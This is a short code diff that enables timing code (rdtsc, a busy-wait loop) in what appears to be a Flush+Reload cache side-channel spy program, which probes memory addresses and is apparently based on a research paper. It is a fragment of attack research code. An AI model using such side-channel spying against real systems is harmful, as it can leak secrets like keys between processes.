@@ -10,7 +10,7 @@
 #define THRESHOLD 300
 
 // DaGe f+r implementation
-//#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++);
+#define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++);
 
 // probe from paper
 int probe_treshold(char *adrs)
@@ -54,7 +54,7 @@ int probe_precise(char *adrs)
 }
 
 // spy process probing certain memory addresses
-/*
+
 static __inline__ unsigned long long rdtsc(void)
 {
     unsigned long long int x;
@@ -76,13 +76,13 @@ void spy(char **target_adrs, int adrs_amount, int probes_amount)
     {
         // update time stamps
         old_tsc = tsc;
-        /*tsc=rdtsc();
+        tsc=rdtsc();
         while (tsc - old_tsc < 2500)
         {
             printf("waiting %llu cycles\n", (2500-tsc+old_tsc) / 50);
-            //busy_wait((2500-tsc+old_tsc) / 50);
-            //tsc = rdtsc();
-        }*/
+            busy_wait((2500-tsc+old_tsc) / 50);
+            tsc = rdtsc();
+        }
         printf("system time counter: %llu, counter diff: %llu\n", tsc, tsc-old_tsc);
         for(int cur_adr_i=0;cur_adr_i<adrs_amount;cur_adr_i++)
         {
